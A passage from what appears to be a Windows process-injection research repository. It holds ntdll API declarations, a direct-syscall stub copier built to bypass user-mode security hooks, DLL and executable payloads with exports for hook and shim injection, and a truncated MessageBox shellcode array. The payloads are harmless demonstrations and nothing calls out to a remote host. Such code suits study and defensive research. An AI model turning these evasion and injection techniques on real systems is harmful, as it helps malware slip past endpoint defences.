            that receives the message sent to the port.

    --*/

    NTSYSAPI
        NTSTATUS
        NTAPI
        NtReplyWaitReceivePort(
            IN  HANDLE PortHandle,
            OUT PVOID* PortContext OPTIONAL,
            IN  PPORT_MESSAGE ReplyMessage OPTIONAL,
            OUT PPORT_MESSAGE ReceiveMessage
        );

    //-----------------------------------------------------------------------------
    // Heap functions

#define HEAP_NO_SERIALIZE               0x00000001
#define HEAP_GROWABLE                   0x00000002
#define HEAP_GENERATE_EXCEPTIONS        0x00000004
#define HEAP_ZERO_MEMORY                0x00000008
#define HEAP_REALLOC_IN_PLACE_ONLY      0x00000010
#define HEAP_TAIL_CHECKING_ENABLED      0x00000020
#define HEAP_FREE_CHECKING_ENABLED      0x00000040
#define HEAP_DISABLE_COALESCE_ON_FREE   0x00000080
#define HEAP_CREATE_ALIGN_16            0x00010000
#define HEAP_CREATE_ENABLE_TRACING      0x00020000
#define HEAP_MAXIMUM_TAG                0x0FFF
#define HEAP_PSEUDO_TAG_FLAG            0x8000

//
// Data structure for heap definition. This includes various
// sizing parameters and callback routines, which, if left NULL,
// result in default behavior
//

    typedef struct RTL_HEAP_PARAMETERS {
        ULONG Length;        //sizeof(RTL_HEAP_PARAMETERS)
        ULONG SegmentReserve;
        ULONG SegmentCommit;
        ULONG DeCommitFreeBlockThreshold;
        ULONG DeCommitTotalFreeThreshold;
        ULONG MaximumAllocationSize;
        ULONG VirtualMemoryThreshold;
        ULONG InitialCommit;
        ULONG InitialReserve;
        PVOID CommitRoutine;
        ULONG Reserved;
    } RTL_HEAP_PARAMETERS, * PRTL_HEAP_PARAMETERS;


#define RtlProcessHeap() (HANDLE)(NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap)


    NTSYSAPI
        HANDLE
        NTAPI
        RtlCreateHeap(
            IN ULONG Flags,
            IN PVOID BaseAddress OPTIONAL,
            IN ULONG SizeToReserve,
            IN ULONG SizeToCommit,
            IN BOOLEAN Lock OPTIONAL,
            IN PRTL_HEAP_PARAMETERS Definition OPTIONAL
        );


    NTSYSAPI
        ULONG
        NTAPI
        RtlDestroyHeap(
            IN HANDLE HeapHandle
        );


    NTSYSAPI
        PVOID
        NTAPI
        RtlAllocateHeap(
            IN HANDLE HeapHandle,
            IN ULONG Flags,
            IN ULONG Size
        );


    NTSYSAPI
        BOOLEAN
        NTAPI
        RtlFreeHeap(
            IN HANDLE HeapHandle,
            IN ULONG Flags,
            IN PVOID Address
        );


    NTSYSAPI
        ULONG
        NTAPI
        RtlCompactHeap(
            IN HANDLE HeapHandle,
            IN ULONG Flags
        );


    NTSYSAPI
        BOOLEAN
        NTAPI
        RtlLockHeap(
            IN HANDLE HeapHandle
        );


    NTSYSAPI
        BOOLEAN
        NTAPI
        RtlUnlockHeap(
            IN HANDLE HeapHandle
        );


    NTSYSAPI
        PVOID
        NTAPI
        RtlReAllocateHeap(
            IN HANDLE HeapHandle,
            IN ULONG Flags,
            IN PVOID Address,
            IN ULONG Size
        );


    NTSYSAPI
        ULONG
        NTAPI
        RtlSizeHeap(
            IN HANDLE HeapHandle,
            IN ULONG Flags,
            IN PVOID Address
        );


    NTSYSAPI
        BOOLEAN
        NTAPI
        RtlValidateHeap(
            IN HANDLE HeapHandle,
            IN ULONG Flags,
            IN PVOID Address OPTIONAL
        );


    //-----------------------------------------------------------------------------
    // Virtual memory functions

    NTSYSAPI
        NTSTATUS
        NTAPI
        NtAllocateVirtualMemory(
            IN HANDLE ProcessHandle,
            IN OUT PVOID* BaseAddress,
            IN ULONG ZeroBits,
            IN OUT PULONG RegionSize,
            IN ULONG AllocationType,
            IN ULONG Protect
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwAllocateVirtualMemory(
            IN HANDLE ProcessHandle,
            IN OUT PVOID* BaseAddress,
            IN ULONG ZeroBits,
            IN OUT PULONG RegionSize,
            IN ULONG AllocationType,
            IN ULONG Protect
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtFreeVirtualMemory(
            IN HANDLE ProcessHandle,
            IN OUT PVOID* BaseAddress,
            IN OUT PULONG RegionSize,
            IN ULONG FreeType
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwFreeVirtualMemory(
            IN HANDLE ProcessHandle,
            IN OUT PVOID* BaseAddress,
            IN OUT PULONG RegionSize,
            IN ULONG FreeType
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtReadVirtualMemory(
            IN HANDLE ProcessHandle,
            IN PVOID BaseAddress,
            OUT PVOID Buffer,
            IN ULONG NumberOfBytesToRead,
            OUT PULONG NumberOfBytesRead OPTIONAL
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtWriteVirtualMemory(
            IN HANDLE ProcessHandle,
            IN PVOID BaseAddress,
            IN PVOID Buffer,
            IN ULONG NumberOfBytesToWrite,
            OUT PULONG NumberOfBytesWritten OPTIONAL
        );


    //-----------------------------------------------------------------------------
    // Section functions

    typedef enum _SECTION_INHERIT
    {
        ViewShare = 1,
        ViewUnmap = 2

    } SECTION_INHERIT;


    typedef enum _SECTION_INFORMATION_CLASS
    {
        SectionBasicInformation,
        SectionImageInformation

    } SECTION_INFORMATION_CLASS, * PSECTION_INFORMATION_CLASS;


    /*++

        NtCreateSection
        ===============

        Creates a section object.

        SectionHandle - Points to a variable that will receive the section
            object handle if the call is successful.

        DesiredAccess - Specifies the type of access that the caller requires
            to the section object. This parameter can be zero, or any combination
            of the following flags:

            SECTION_QUERY       - Query access
            SECTION_MAP_WRITE   - Can be written when mapped
            SECTION_MAP_READ    - Can be read when mapped
            SECTION_MAP_EXECUTE - Can be executed when mapped
            SECTION_EXTEND_SIZE - Extend access
            SECTION_ALL_ACCESS  - All of the preceding +
                                  STANDARD_RIGHTS_REQUIRED

        ObjectAttributes - Points to a structure that specifies the object s attributes.
            OBJ_OPENLINK is not a valid attribute for a section object.

        MaximumSize - Optionally points to a variable that specifies the size,
            in bytes, of the section. If FileHandle is zero, the size must be
            specified; otherwise, it can be defaulted from the size of the file
            referred to by FileHandle.

        SectionPageProtection - The protection desired for the pages
            of the section when the section is mapped. This parameter can take
            one of the following values:

            PAGE_READONLY
            PAGE_READWRITE
            PAGE_WRITECOPY
            PAGE_EXECUTE
            PAGE_EXECUTE_READ
            PAGE_EXECUTE_READWRITE
            PAGE_EXECUTE_WRITECOPY

        AllocationAttributes - The attributes for the section. This parameter must
            be a combination of the following values:

            SEC_BASED     0x00200000    // Map section at same address in each process
            SEC_NO_CHANGE 0x00400000    // Disable changes to protection of pages
            SEC_IMAGE     0x01000000    // Map section as an image
            SEC_VLM       0x02000000    // Map section in VLM region
            SEC_RESERVE   0x04000000    // Reserve without allocating pagefile storage
            SEC_COMMIT    0x08000000    // Commit pages; the default behavior
            SEC_NOCACHE   0x10000000    // Mark pages as non-cacheable

        FileHandle - Identifies the file from which to create the section object.
            The file must be opened with an access mode compatible with the protection
            flags specified by the Protect parameter. If FileHandle is zero,
            the function creates a section object of the specified size backed
            by the paging file rather than by a named file in the file system.

    --*/

    NTSYSAPI NTSTATUS NTAPI NtCreateDirectoryObject(
        PHANDLE            DirectoryHandle,
        ACCESS_MASK        DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes);

    NTSYSAPI
        NTSTATUS
        NTAPI
        NtCreateSection(
            OUT PHANDLE SectionHandle,
            IN  ACCESS_MASK DesiredAccess,
            IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
            IN  PLARGE_INTEGER MaximumSize OPTIONAL,
            IN  ULONG SectionPageProtection,
            IN  ULONG AllocationAttributes,
            IN  HANDLE FileHandle OPTIONAL
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwCreateSection(
            OUT PHANDLE SectionHandle,
            IN  ACCESS_MASK DesiredAccess,
            IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
            IN  PLARGE_INTEGER MaximumSize OPTIONAL,
            IN  ULONG SectionPageProtection,
            IN  ULONG AllocationAttributes,
            IN  HANDLE FileHandle OPTIONAL
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtOpenSection(
            OUT PHANDLE SectionHandle,
            IN ACCESS_MASK DesiredAccess,
            IN POBJECT_ATTRIBUTES ObjectAttributes
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwOpenSection(
            OUT PHANDLE SectionHandle,
            IN ACCESS_MASK DesiredAccess,
            IN POBJECT_ATTRIBUTES ObjectAttributes
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtMapViewOfSection(
            IN HANDLE SectionHandle,
            IN HANDLE ProcessHandle,
            IN OUT PVOID* BaseAddress,
            IN ULONG_PTR ZeroBits,
            IN SIZE_T CommitSize,
            IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
            IN OUT PSIZE_T ViewSize,
            IN SECTION_INHERIT InheritDisposition,
            IN ULONG AllocationType,
            IN ULONG Protect
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwMapViewOfSection(
            IN HANDLE SectionHandle,
            IN HANDLE ProcessHandle,
            IN OUT PVOID* BaseAddress,
            IN ULONG_PTR ZeroBits,
            IN SIZE_T CommitSize,
            IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
            IN OUT PSIZE_T ViewSize,
            IN SECTION_INHERIT InheritDisposition,
            IN ULONG AllocationType,
            IN ULONG Protect
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtUnmapViewOfSection(
            IN HANDLE ProcessHandle,
            IN PVOID BaseAddress
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwUnmapViewOfSection(
            IN HANDLE ProcessHandle,
            IN PVOID BaseAddress
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtExtendSection(
            IN HANDLE SectionHandle,
            IN OUT PLARGE_INTEGER SectionSize
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwExtendSection(
            IN HANDLE SectionHandle,
            IN OUT PLARGE_INTEGER SectionSize
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtQuerySection(
            IN HANDLE SectionHandle,
            IN SECTION_INFORMATION_CLASS SectionInformationClass,
            OUT PVOID SectionInformation,
            IN ULONG Length,
            OUT PULONG ResultLength OPTIONAL
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwQuerySection(
            IN HANDLE SectionHandle,
            IN SECTION_INFORMATION_CLASS SectionInformationClass,
            OUT PVOID SectionInformation,
            IN ULONG Length,
            OUT PULONG ResultLength OPTIONAL
        );


    //-----------------------------------------------------------------------------
    // Synchronization

    //
    // Wait type
    //

    typedef enum _WAIT_TYPE {
        WaitAll,
        WaitAny
    } WAIT_TYPE;


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtWaitForSingleObject(
            IN HANDLE Handle,
            IN BOOLEAN Alertable,
            IN PLARGE_INTEGER Timeout OPTIONAL
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwWaitForSingleObject(
            IN HANDLE Handle,
            IN BOOLEAN Alertable,
            IN PLARGE_INTEGER Timeout OPTIONAL
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtWaitForMultipleObjects(
            IN ULONG Count,
            IN HANDLE Handle[],
            IN WAIT_TYPE WaitType,
            IN BOOLEAN Alertable,
            IN PLARGE_INTEGER Timeout OPTIONAL
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwWaitForMultipleObjects(
            IN ULONG Count,
            IN HANDLE Handle[],
            IN WAIT_TYPE WaitType,
            IN BOOLEAN Alertable,
            IN PLARGE_INTEGER Timeout OPTIONAL
        );


    //-----------------------------------------------------------------------------
    // Event support

    typedef enum _EVENT_INFORMATION_CLASS {
        EventBasicInformation    // = 0
    } EVENT_INFORMATION_CLASS;

    typedef struct _EVENT_BASIC_INFORMATION {
        EVENT_TYPE EventType;
        LONG EventState;
    } EVENT_BASIC_INFORMATION, * PEVENT_BASIC_INFORMATION;

    //
    // Event handling routines
    //


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtCreateEvent(
            OUT PHANDLE EventHandle,
            IN ACCESS_MASK DesiredAccess,
            IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
            IN EVENT_TYPE EventType,
            IN BOOLEAN InitialState
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwCreateEvent(
            OUT PHANDLE EventHandle,
            IN ACCESS_MASK DesiredAccess,
            IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
            IN EVENT_TYPE EventType,
            IN BOOLEAN InitialState
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtClearEvent(
            IN HANDLE Handle
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwClearEvent(
            IN HANDLE Handle
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtPulseEvent(
            IN HANDLE Handle,
            OUT PLONG PreviousState OPTIONAL
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwPulseEvent(
            IN HANDLE Handle,
            OUT PLONG PreviousState OPTIONAL
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtResetEvent(
            IN HANDLE Handle,
            OUT PLONG PreviousState OPTIONAL
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwResetEvent(
            IN HANDLE Handle,
            OUT PLONG PreviousState OPTIONAL
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtSetEvent(
            IN HANDLE Handle,
            OUT PLONG PreviousState OPTIONAL
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwSetEvent(
            IN HANDLE Handle,
            OUT PLONG PreviousState OPTIONAL
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtOpenEvent(
            OUT PHANDLE EventHandle,
            IN ACCESS_MASK DesiredAccess,
            IN POBJECT_ATTRIBUTES ObjectAttributes
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwOpenEvent(
            OUT PHANDLE EventHandle,
            IN ACCESS_MASK DesiredAccess,
            IN POBJECT_ATTRIBUTES ObjectAttributes
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtQueryEvent(
            IN HANDLE EventHandle,
            IN EVENT_INFORMATION_CLASS EventInfoClass,
            OUT PVOID EventInfo,
            IN ULONG Length,
            OUT PULONG ResultLength OPTIONAL
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        ZwQueryEvent(
            IN HANDLE EventHandle,
            IN EVENT_INFORMATION_CLASS EventInfoClass,
            OUT PVOID EventInfo,
            IN ULONG Length,
            OUT PULONG ResultLength OPTIONAL
        );


    //-----------------------------------------------------------------------------
    // Security descriptor functions

    NTSYSAPI
        NTSTATUS
        NTAPI
        RtlCreateSecurityDescriptor(
            IN PSECURITY_DESCRIPTOR SecurityDescriptor,
            IN ULONG Revision
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        RtlSetDaclSecurityDescriptor(
            IN PSECURITY_DESCRIPTOR SecurityDescriptor,
            IN BOOLEAN DaclPresent,
            IN PACL Dacl OPTIONAL,
            IN BOOLEAN DaclDefaulted OPTIONAL
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        RtlSetOwnerSecurityDescriptor(
            IN PSECURITY_DESCRIPTOR SecurityDescriptor,
            IN PSID Owner OPTIONAL,
            IN BOOLEAN OwnerDefaulted OPTIONAL
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        RtlAllocateAndInitializeSid(
            IN PSID_IDENTIFIER_AUTHORITY IdentifierAuthority,
            IN UCHAR SubAuthorityCount,
            IN ULONG SubAuthority0,
            IN ULONG SubAuthority1,
            IN ULONG SubAuthority2,
            IN ULONG SubAuthority3,
            IN ULONG SubAuthority4,
            IN ULONG SubAuthority5,
            IN ULONG SubAuthority6,
            IN ULONG SubAuthority7,
            OUT PSID* Sid
        );


    NTSYSAPI
        ULONG
        NTAPI
        RtlLengthSid(
            IN PSID Sid
        );


    NTSYSAPI
        BOOLEAN
        NTAPI
        RtlEqualSid(
            IN PSID Sid1,
            IN PSID Sid2
        );


    NTSYSAPI
        PVOID
        NTAPI
        RtlFreeSid(
            IN PSID Sid
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        RtlCreateAcl(
            IN PACL Acl,
            IN ULONG AclLength,
            IN ULONG AclRevision
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        RtlAddAccessAllowedAce(
            IN OUT PACL Acl,
            IN ULONG AceRevision,
            IN ACCESS_MASK AccessMask,
            IN PSID Sid
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        RtlAddAccessAllowedAceEx(
            IN OUT PACL Acl,
            IN ULONG AceRevision,
            IN ULONG AceFlags,
            IN ULONG AccessMask,
            IN PSID Sid
        );

    //-----------------------------------------------------------------------------
    // Token functions

    NTSYSAPI
        NTSTATUS
        NTAPI
        NtOpenProcessToken(
            IN HANDLE ProcessHandle,
            IN ACCESS_MASK DesiredAccess,
            OUT PHANDLE TokenHandle
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtOpenThreadToken(
            IN HANDLE ThreadHandle,
            IN ACCESS_MASK DesiredAccess,
            IN BOOLEAN OpenAsSelf,
            OUT PHANDLE TokenHandle
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtQueryInformationToken(
            IN HANDLE  TokenHandle,
            IN TOKEN_INFORMATION_CLASS  TokenInformationClass,
            OUT PVOID  TokenInformation,
            IN ULONG  TokenInformationLength,
            OUT PULONG  ReturnLength
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtSetInformationToken(
            IN HANDLE  TokenHandle,
            IN TOKEN_INFORMATION_CLASS  TokenInformationClass,
            IN PVOID  TokenInformation,
            IN ULONG  TokenInformationLength
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtAdjustPrivilegesToken(
            IN HANDLE TokenHandle,
            IN BOOLEAN DisableAllPrivileges,
            IN PTOKEN_PRIVILEGES NewState OPTIONAL,
            IN ULONG BufferLength OPTIONAL,
            IN PTOKEN_PRIVILEGES PreviousState OPTIONAL,
            OUT PULONG ReturnLength
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtDuplicateToken(
            IN HANDLE ExistingTokenHandle,
            IN ACCESS_MASK DesiredAccess,
            IN POBJECT_ATTRIBUTES ObjectAttributes,
            IN BOOLEAN EffectiveOnly,
            IN TOKEN_TYPE TokenType,
            OUT PHANDLE NewTokenHandle
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtCompareTokens(
            IN  HANDLE FirstTokenHandle,
            IN  HANDLE SecondTokenHandle,
            OUT PBOOLEAN IdenticalTokens
        );


    //-----------------------------------------------------------------------------
    // Symbolic links

    //
    // Object Manager Symbolic Link Specific Access Rights.
    //

#ifndef SYMBOLIC_LINK_QUERY
#define SYMBOLIC_LINK_QUERY (0x0001)
#define SYMBOLIC_LINK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)
#endif

    NTSYSAPI
        NTSTATUS
        NTAPI
        NtOpenSymbolicLinkObject(
            OUT PHANDLE SymbolicLinkHandle,
            IN ACCESS_MASK DesiredAccess,
            IN POBJECT_ATTRIBUTES ObjectAttributes
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtQuerySymbolicLinkObject(
            IN HANDLE SymbolicLinkHandle,
            OUT PUNICODE_STRING NameString,
            OUT PULONG ResultLength OPTIONAL
        );

    //-----------------------------------------------------------------------------
    // Loader functions

    NTSYSAPI
        NTSTATUS
        NTAPI
        LdrGetDllHandle(
            IN PWSTR DllPath OPTIONAL,
            IN PULONG DllCharacteristics OPTIONAL,
            IN PUNICODE_STRING DllName,
            OUT PVOID* DllHandle
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        LdrGetProcedureAddress(
            IN PVOID DllHandle,
            IN PANSI_STRING ProcedureName OPTIONAL,
            IN ULONG ProcedureNumber OPTIONAL,
            OUT PVOID* ProcedureAddress
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        LdrLoadDll(
            IN PWSTR DllPath OPTIONAL,
            IN PULONG DllCharacteristics OPTIONAL,
            IN PUNICODE_STRING DllName,
            OUT PVOID* DllHandle
        );

    NTSYSAPI
        NTSTATUS
        NTAPI
        LdrFindEntryForAddress(
            IN PVOID Address,
            OUT PLDR_DATA_TABLE_ENTRY* Module
        );

    NTSYSAPI
        VOID
        NTAPI
        RtlGetCallersAddress(
            OUT PVOID* CallersAddress,
            OUT PVOID* CallersCaller
        );

    //-----------------------------------------------------------------------------
    // Functions dealing with NTSTATUS and Win32 error

    NTSYSAPI
        ULONG
        NTAPI
        RtlNtStatusToDosError(
            NTSTATUS Status
        );


    NTSYSAPI
        ULONG
        NTAPI
        RtlNtStatusToDosErrorNoTeb(
            NTSTATUS Status
        );


    NTSYSAPI
        NTSTATUS
        NTAPI
        RtlGetLastNtStatus(
        );


    NTSYSAPI
        ULONG
        NTAPI
        RtlGetLastWin32Error(
        );


    NTSYSAPI
        VOID
        NTAPI
        RtlSetLastWin32Error(
            ULONG WinError
        );


    NTSYSAPI
        VOID
        NTAPI
        RtlSetLastWin32ErrorAndNtStatusFromNtStatus(
            NTSTATUS Status
        );


    //-----------------------------------------------------------------------------
    // I/O functions


    NTSYSAPI
        NTSTATUS
        NTAPI
        NtDisplayString(
            IN PUNICODE_STRING String
        );


#ifdef __cplusplus
} // extern "C"
#endif

#endif // __NTDLL_H__

```

`mitigation/evasion/copysyscallstub.cpp`:

```cpp
#include <Windows.h>
#include <cstdint>
#include "winternl.h"
#include <iostream>
#include <shlobj.h>
#include <wchar.h>
#include <fstream>

using fnNtCreateFile = NTSTATUS(NTAPI*)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);


int main()
{
	// get path to desktop
	char desktopPath[MAX_PATH + 1];
	SHGetSpecialFolderPathA(HWND_DESKTOP, desktopPath, CSIDL_DESKTOP, FALSE);

	// construct path absolute file path
	static char path[MAX_PATH + 1];
	strcat(path, "\\??\\");
	strcat(path, desktopPath);
	strcat(path, "\\syscall_NtCreateFile.txt");

	// convert path to wchar
	wchar_t wPath[MAX_PATH + 1];
	mbstowcs(wPath, path, strlen(path) + 1);

#ifdef _WIN64
	/*
	| 4C:8BD1				| mov r10,rcx
	| B8 55000000			| mov eax,55
	| F60425 0803FE7F 01	| test byte ptr ds:[7FFE0308],1
	| 75 03					| jne ntdll.7FFD821AD815
	| 0F05					| syscall
	| C3					| ret
	| CD 2E					| int 2E
	| C3					| ret
	*/
	const int SYSCALLSTUB_LENGTH = 0x18;
#else
	/* 32 bit
	| B8 8C010000	| mov eax,18C
	| BA 0003FE7F	| mov edx,<&KiFastSystemCall>
	| FF12			| call dword ptr ds:[edx]
	| C2 2400		| ret 24
	*/
	/* WoW
	| B8 55000000	| mov eax, 55
	| BA 70880477	| mov edx, ntdll.77048870
	| FFD2			| call edx
	| C2 2C00		| ret 2C
	*/
	const int SYSCALLSTUB_LENGTH = 15;
#endif
	int8_t syscallStub[SYSCALLSTUB_LENGTH];

	// resolve syscall address
	HMODULE ntdllHandle = LoadLibraryA("ntdll.dll");
	if (!ntdllHandle)
	{
		printf("Error %d - Failed to acquire ntdll.dll handle\n", GetLastError());
		return 1;
	}

	auto ntCreateFileAddress = GetProcAddress(ntdllHandle, "NtCreateFile");
	if (!ntCreateFileAddress)
	{
		printf("Error %d - Failed to resolve NtCreateFile\n", GetLastError());
		return 1;
	}

	printf("[Info] - Found NtCreateFile at %p\n", ntCreateFileAddress);

	// copy syscall stub
	memcpy(syscallStub, ntCreateFileAddress, SYSCALLSTUB_LENGTH);

	printf("[Info] - Copied %d bytes from NtCreateFile (%p) to stub (%p)\n", SYSCALLSTUB_LENGTH, ntCreateFileAddress, syscallStub);

	// make stub executable
	DWORD oldProtection;
	if (!VirtualProtect(syscallStub, SYSCALLSTUB_LENGTH, PAGE_EXECUTE_READWRITE, &oldProtection))
	{
		printf("Error %d - Failed to make syscall stub executable\n", GetLastError());
		return 1;
	}

	fnNtCreateFile directSyscallCreateFile = (fnNtCreateFile)(void*)syscallStub;

	// setup parameters
	HANDLE fileHandle = NULL;
	OBJECT_ATTRIBUTES objectAttributes;
	NTSTATUS status = NULL;
	UNICODE_STRING fileName;
	RtlInitUnicodeString(&fileName, wPath);
	IO_STATUS_BLOCK osb;
	ZeroMemory(&osb, sizeof(IO_STATUS_BLOCK));
	InitializeObjectAttributes(&objectAttributes, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
	
	// invoke syscallstub
	if (NT_SUCCESS(directSyscallCreateFile(&fileHandle, FILE_GENERIC_WRITE, &objectAttributes, &osb, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0)))
	{
		printf("[Info] - Successfully executed syscall stub, creating file %wS\n", wPath);
	}
	else
	{
		printf("Error %d - Failed to create file\n", GetLastError());
		return 1;
	}

	return 0;
}
```

`payload/dll_payload.cpp`:

```cpp
/**
* Spawns a MessageBox and then unloads itself from the process it has been loaded into.
*
*/

#include <Windows.h>

// export for SetWindowsHook injection
extern "C" __declspec(dllexport) int SetWindowsHookCallback(int code, WPARAM wParam, LPARAM lParam)
{
	Beep(300, 200);
	return(CallNextHookEx(NULL, code, wParam, lParam));
}

// exports for shim injection
extern "C" __declspec(dllexport) int GetHookAPIs(PVOID a, PVOID b, PVOID c)
{
	return 0x01;
}

extern "C" __declspec(dllexport) int NotifyShims(PVOID a, PVOID b)
{
	return 0x01;
}

DWORD __stdcall Run(LPVOID hModule)
{
	MessageBoxA(NULL, "Message from payload", "Injected payload", MB_OK);
	FreeLibraryAndExitThread(static_cast<HMODULE>(hModule), 0);
	return TRUE;
}

BOOL __stdcall DllMain(HINSTANCE hModule, DWORD dwReason, LPVOID lpReserved)
{
	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
		CreateThread(nullptr, 0, Run, hModule, 0, nullptr);
		break;
	case DLL_PROCESS_DETACH:
		break;
	default:
		break;
	}
	return TRUE;
}
```

`payload/executable_payload.cpp`:

```cpp
/**
* Spawns a MessageBox and then exits.
*
*/

#include <Windows.h>


int main(int argc, char* argv[])
{
	MessageBoxA(NULL, "Message from payload", "Injected payload", MB_OK);
	return 0;
}
```

`payload/shellcode.hpp`:

```hpp
#pragma once 



/**
* Spawns a MessageBox.
*
*/
#ifdef _WIN64
// https://gist.github.com/kkent030315/b508e56a5cb0e3577908484fa4978f12
char shellcode[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
